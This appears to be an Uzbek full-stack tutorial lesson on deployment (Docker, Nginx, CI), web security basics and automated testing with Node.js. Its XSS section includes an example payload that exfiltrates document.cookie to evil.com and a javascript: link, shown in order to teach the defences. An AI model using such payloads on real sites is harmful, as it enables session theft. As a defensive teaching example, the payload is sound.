Deploy, xavfsizlik va testlash

Ilovani internetga chiqarish (PaaS, VPS, Docker, Nginx, HTTPS), CI/CD, OWASP asosiy zaifliklari (XSS, SQLi, CSRF), unumdorlik hamda avtomatik testlar (node:test, Supertest, Vitest).

Kompyuteringizda ishlaydigan ilova hali mahsulot emas. Uni haqiqiy foydalanuvchilarga yetkazish uchun: (1) internetdagi serverga joylash (deploy), (2) hujumlardan himoyalash, (3) har bir o'zgarishdan keyin hech narsa buzilmaganini avtomatik tekshirish kerak. Bu dars full-stack dasturchini "kod yozuvchi"dan "mahsulot yetkazuvchi"ga aylantiradi.

#Deploy: muhitlar va asosiy tushunchalar

  • Development — sizning kompyuteringiz: batafsil xatolar, avtomatik qayta yuklash.
  • Staging — production'ning nusxasi, sinov uchun.
  • Production — haqiqiy foydalanuvchilar: minifikatsiya, kesh, xatolar yashirilgan, HTTPS majburiy.

12-Factor App tamoyillarining eng muhimlari: konfiguratsiya muhit o'zgaruvchilarida; ilova holatsiz (fayllar va sessiyalar diskda emas — baza/S3/Redis'da); loglar stdout ga; build va ishga tushirish bosqichlari ajratilgan; dev va prod iloji boricha o'xshash.

#Docker asoslari

Docker ilovani barcha bog'liqliklari (Node versiyasi, paketlar, tizim kutubxonalari) bilan birga konteynerga o'raydi. "Mening kompyuterimda ishlayapti" muammosi yo'qoladi: konteyner har qayerda bir xil ishlaydi.

  • Image — ilovaning "qolipi" (faqat o'qish uchun), Dockerfile asosida quriladi.
  • Container — image'ning ishlab turgan nusxasi.
  • Volume — konteyner o'chsa ham saqlanadigan ma'lumot (baza fayllari).
  • Docker Compose — bir nechta konteynerni (API + baza) bitta faylda tasvirlash.
Terminal
docker build -t notes-app .
docker run -d -p 3000:3000 --env-file .env --name notes notes-app
docker ps                    # ishlayotgan konteynerlar
docker logs -f notes         # loglar
docker exec -it notes sh     # konteyner ichiga kirish
docker stop notes && docker rm notes

/etc/nginx/sites-available/notes
server {
    server_name notes.example.uz;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;       # WebSocket uchun
        proxy_set_header Connection "upgrade";
    }

    client_max_body_size 5m;
    gzip on;
    gzip_types text/css application/javascript application/json image/svg+xml;
}

VPS xavfsizligi minimum SSH'da parol bilan kirishni o'chiring (faqat kalit), root bilan kirishni taqiqlang, firewall (ufw allow OpenSSH; ufw allow 'Nginx Full'; ufw enable), avtomatik xavfsizlik yangilanishlari, PostgreSQL portini (5432) tashqariga ochmang.

#CI/CD — avtomatik tekshirish va deploy

CI (Continuous Integration) — har bir push/PR'da testlar va linter avtomatik ishlaydi. CD (Continuous Delivery/Deployment) — main ga merge qilingan kod avtomatik deploy qilinadi. GitHub'da buning uchun GitHub Actions bor.

.github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:                       # testlar uchun haqiqiy baza
        image: postgres:17
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: notes_test
        ports: ['5432:5432']
        options: >-
          --health-cmd pg_isready --health-interval 5s --health-timeout 5s --health-retries 10
    env:
      DATABASE_URL: postgres://postgres:test@localhost:5432/notes_test
      JWT_SECRET: test-secret-test-secret-test-secret
      NODE_ENV: test
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: server/package-lock.json
      - run: npm ci
        working-directory: server
      - run: psql "$DATABASE_URL" -f db/schema.sql
        working-directory: server
      - run: npm test
        working-directory: server

GitHub'da Settings → Branches → Branch protection orqali "CI yashil bo'lmasa merge qilib bo'lmaydi" qoidasini yoqing. Render/Railway kabi platformalar esa main yangilanganda o'zi avtomatik deploy qiladi.

XSS chuqurroq va Content Security Policy

JavaScript
// Hujum: izoh sifatida yuboriladi
const comment = `<img src=x onerror="fetch('https://evil.com/steal?c=' + document.cookie)">`;

element.innerHTML = comment;     // ❌ skript bajariladi
element.textContent = comment;   // ✅ matn sifatida ko'rinadi
<p>{comment}</p>                 // ✅ React avtomatik ekranlaydi
<div dangerouslySetInnerHTML={{ __html: comment }} />          // ❌
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(markdownHtml) }} />  // ✅ tozalangan

// Yana bir yashirin XSS: javascript: havolalar
<a href={user.website}>Sayt</a>    // website = "javascript:alert(1)" bo'lsa xavfli!
// → URL'ni tekshiring: faqat http(s):// bilan boshlanganlarga ruxsat

CSP (Content-Security-Policy) sarlavhasi — "zaxira himoya": XSS sodir bo'lsa ham, brauzer faqat ruxsat etilgan manbalardagi skriptlarni bajaradi. helmet() uni standart sozlamalar bilan qo'yadi:

JavaScript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],                       // inline <script> va boshqa domenlar bloklanadi
      imgSrc: ["'self'", 'data:', 'https://cdn.example.uz'],
      connectSrc: ["'self'"],
    },
  },
}));

CSRF

Siz bank.uz ga kirgansiz (cookie bor). evil.com sahifasida yashirin forma bank.uz/transfer ga POST yuboradi — brauzer cookie'ni avtomatik qo'shadi. Himoya: (1) cookie'larda SameSite=Lax yoki Strict (zamonaviy brauzerlarda Lax standart); (2) holatni o'zgartiruvchi amallar faqat POST/PUT/PATCH/DELETE; (3) qo'shimcha himoya uchun CSRF tokeni yoki Origin sarlavhasini tekshirish.

Xavfsizlik nazorat ro'yxati (deploy oldidan)

  • ☐ HTTPS majburiy, HTTP → HTTPS yo'naltirish
  • ☐ .env git'da yo'q, production kalitlari kuchli va noyob
  • ☐ NODE_ENV=production, xato javoblarida stack trace yo'q
  • ☐ helmet, CORS faqat o'z domeningiz, express.json({ limit })
  • ☐ Login va ro'yxatdan o'tishda rate limit
  • ☐ Barcha kirish ma'lumotlari validatsiya qilinadi; SQL faqat parametrlar bilan
  • ☐ Har bir resursda egalik tekshiruvi
  • ☐ Cookie: HttpOnly; Secure; SameSite
  • ☐ npm audit toza; Dependabot yoqilgan
  • ☐ Bazaning zaxira nusxasi (backup) avtomatik va tiklash sinab ko'rilgan

#Testlash

Qo'lda tekshirish har safar 10 daqiqa oladi va bir narsani unutasiz. Avtomatik testlar sekundlarda ishlaydi va o'zgarishdan keyin "eski funksiyalar buzilmadimi?" degan savolga ishonchli javob beradi. Ular, shuningdek, kodni qo'rqmasdan qayta yozish (refactoring) imkonini beradi.

Test piramidasi

  • Unit testlar (ko'p, tez) — alohida funksiyalar: hisobla(savat), reducer, validatsiya sxemasi.
  • Integratsion testlar (o'rtacha) — bir necha qism birga: API marshruti + baza.
  • E2E testlar (kam, sekin) — haqiqiy brauzerda foydalanuvchi ssenariysi: Playwright, Cypress.

Yaxshi test AAA tuzilishiga ega: Arrange (tayyorlash) → Act (bajarish) → Assert (tekshirish). U amalga oshirishni emas, xatti-harakatni tekshiradi.

Unit testlar: Node.js'ning o'rnatilgan test runner'i

Node 20+ da qo'shimcha kutubxonasiz test yozish mumkin. 4-darsdagi savat funksiyasini test qilamiz.

src/cart.js
export const BEPUL_YETKAZISH = 1_000_000;
export const YETKAZISH_NARXI = 25_000;

export function hisobla(items, { promo } = {}) {
  if (!Array.isArray(items)) throw new TypeError('items massiv bo\'lishi kerak');
  const oraliq = items.reduce((s, { narx, soni, chegirma = 0 }) => {
    if (soni < 0 || narx < 0) throw new RangeError('Manfiy qiymat');
    return s + Math.round(narx * (1 - chegirma)) * soni;
  }, 0);
  const promodan = promo === 'BAHOR10' ? Math.round(oraliq * 0.9) : oraliq;
  const yetkazish = promodan === 0 || promodan >= BEPUL_YETKAZISH ? 0 : YETKAZISH_NARXI;
  return { oraliq, yetkazish, jami: promodan + yetkazish };
}
test/cart.test.js
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { hisobla, YETKAZISH_NARXI } from '../src/cart.js';

describe('hisobla()', () => {
  it('bo\'sh savat — hammasi nol', () => {
    assert.deepEqual(hisobla([]), { oraliq: 0, yetkazish: 0, jami: 0 });
  });

  it('kichik xaridga yetkazish narxi qo\'shiladi', () => {
    // Arrange
    const items = [{ narx: 100_000, soni: 2 }];
    // Act
    const r = hisobla(items);
    // Assert
    assert.equal(r.oraliq, 200_000);
    assert.equal(r.yetkazish, YETKAZISH_NARXI);
    assert.equal(r.jami, 225_000);
  });

  it('1 000 000 dan oshsa yetkazish bepul (chegara qiymati)', () => {
    assert.equal(hisobla([{ narx: 1_000_000, soni: 1 }]).yetkazish, 0);
    assert.equal(hisobla([{ narx: 999_999, soni: 1 }]).yetkazish, YETKAZISH_NARXI);
  });

  it('mahsulot chegirmasi va promokod birga qo\'llanadi', () => {
    const r = hisobla([{ narx: 500_000, soni: 2, chegirma: 0.1 }], { promo: 'BAHOR10' });
    assert.equal(r.oraliq, 900_000);
    assert.equal(r.jami, 810_000 + YETKAZISH_NARXI);
  });

  it('noto\'g\'ri kirishda xato tashlaydi', () => {
    assert.throws(() => hisobla(null), TypeError);
    assert.throws(() => hisobla([{ narx: 100, soni: -1 }]), /Manfiy/);
  });
});

import { describe, it, before, after, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import { app } from '../src/app.js';
import { pool } from '../src/db.js';

// Har bir test toza bazada ishlaydi
beforeEach(() => pool.query('TRUNCATE users, notes CASCADE'));
after(() => pool.end());

// Yordamchi: ro'yxatdan o'tib, cookie'li "agent" qaytaradi (brauzerga o'xshab cookie saqlaydi)
async function signup(email = 'ali@test.uz') {
  const agent = request.agent(app);
  await agent.post('/api/auth/register')
    .send({ name: 'Ali', email, password: 'parol12345' })
    .expect(201);
  return agent;
}

describe('Auth', () => {
  it('ro\'yxatdan o\'tish httpOnly cookie qaytaradi', async () => {
    const res = await request(app).post('/api/auth/register')
      .send({ name: 'Vali', email: 'vali@test.uz', password: 'parol12345' })
      .expect(201);
    assert.equal(res.body.user.email, 'vali@test.uz');
    assert.equal(res.body.user.password_hash, undefined);          // xesh hech qachon qaytmasin!
    assert.match(res.headers['set-cookie'][0], /HttpOnly/);
  });

  it('takroriy email — 409', async () => {
    await signup('a@test.uz');
    await request(app).post('/api/auth/register')
      .send({ name: 'Boshqa', email: 'A@TEST.UZ', password: 'parol12345' })   // katta harf ham!
      .expect(409);
  });

  it('noto\'g\'ri parol — 401 va umumiy xabar', async () => {
    await signup('b@test.uz');
    const res = await request(app).post('/api/auth/login')
      .send({ email: 'b@test.uz', password: 'xato-parol' })
      .expect(401);
    assert.equal(res.body.error.message, 'Email yoki parol noto\'g\'ri');
  });
});

describe('Notes', () => {
  it('cookie\'siz — 401', async () => {
    await request(app).get('/api/notes').expect(401);
  });

  it('CRUD to\'liq sikli', async () => {
    const agent = await signup();

    const { body: created } = await agent.post('/api/notes')
      .send({ title: 'Test', body: 'Matn', tags: ['Ish', 'ish'] })
      .expect(201);
    assert.deepEqual(created.tags, ['ish']);                         // kichik harf + takrorsiz

    const { body: list } = await agent.get('/api/notes?q=matn').expect(200);
    assert.equal(list.data.length, 1);

    const { body: updated } = await agent.patch(`/api/notes/${created.id}`)
      .send({ pinned: true }).expect(200);
    assert.equal(updated.pinned, true);

    await agent.delete(`/api/notes/${created.id}`).expect(204);
    await agent.get('/api/notes').expect(200).then(r => assert.equal(r.body.data.length, 0));
  });

  it('🔒 boshqa foydalanuvchining eslatmasini o\'zgartirib bo\'lmaydi (IDOR)', async () => {
    const ali = await signup('ali@test.uz');
    const hacker = await signup('hacker@test.uz');
    const { body: note } = await ali.post('/api/notes').send({ title: 'Maxfiy' }).expect(201);

    await hacker.patch(`/api/notes/${note.id}`).send({ title: 'Buzildi' }).expect(404);
    await hacker.delete(`/api/notes/${note.id}`).expect(404);
    const { body } = await hacker.get('/api/notes').expect(200);
    assert.equal(body.data.length, 0);
  });

  it('noma\'lum maydon (user_id) qabul qilinmaydi', async () => {
    const agent = await signup();
    const { body: note } = await agent.post('/api/notes').send({ title: 'X' });
    await agent.patch(`/api/notes/${note.id}`).send({ user_id: '00000000-0000-0000-0000-000000000000' }).expect(400);
  });

  it('validatsiya: bo\'sh eslatma — 400 va tafsilotlar', async () => {
    const agent = await signup();
    const res = await agent.post('/api/notes').send({ title: '', body: '' }).expect(400);
    assert.ok(Array.isArray(res.body.error.details));
  });
});

FROM node:22-alpine AS client

RUN npm ci

# 2-bosqich: faqat production bog'liqliklari bilan server

ENV NODE_ENV=production
WORKDIR /app/server
COPY server/package*.json ./
RUN npm ci --omit=dev
COPY server/ ./
COPY --from=client /app/client/dist /app/client/dist
# root emas — xavfsizroq
USER node
EXPOSE 3000
HEALTHCHECK CMD wget -qO- http://localhost:3000/api/health || exit 1

notes-app/docker-compose.yml
services:
  db:
    image: postgres:17
    restart: unless-stopped
    environment:
      POSTGRES_DB: notes
      POSTGRES_PASSWORD: ${DB_PASSWORD}
    volumes:
      - pgdata:/var/lib/postgresql/data
      - ./server/db/schema.sql:/docker-entrypoint-initdb.d/schema.sql:ro   # birinchi ishga tushishda
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      retries: 10

  app:
    build: .
    restart: unless-stopped
    depends_on:
      db:
        condition: service_healthy
    environment:
      DATABASE_URL: postgres://postgres:${DB_PASSWORD}@db:5432/notes    # "db" — servis nomi = host
      JWT_SECRET: ${JWT_SECRET}
      PORT: 3000
    ports:
      - "3000:3000"

B) Render.com'ga joylash (PaaS — eng oson yo'l)

  1. Loyihani GitHub'ga push qiling (7-dars).
  2. Render'da New → PostgreSQL — bepul baza yarating, "Internal Database URL" ni nusxalang. schema.sql ni psql orqali bir marta ishga tushiring.
  3. New → Web Service → repozitoriyani tanlang → Runtime: Docker (yuqoridagi Dockerfile ishlatiladi).
  4. Environment: DATABASE_URL, JWT_SECRET (yangi, kuchli kalit), NODE_ENV=production.
  5. Health Check Path: /api/health. Deploy!
  6. Bir necha daqiqadan so'ng ilova https://notes-xxxx.onrender.com da HTTPS bilan ishlaydi. Har bir git push — avtomatik qayta deploy.
  7. O'z domeningiz: Render → Settings → Custom Domain, domen DNS'ida CNAME yozuvi (1-dars).
Deploy'dan keyin Xatolarni kuzatish (Sentry), uptime monitoring (UptimeRobot — sayt o'chsa xabar beradi), loglarni ko'rish va bazaning muntazam zaxira nusxalari — bularsiz production ilova "ko'r" holda ishlaydi.
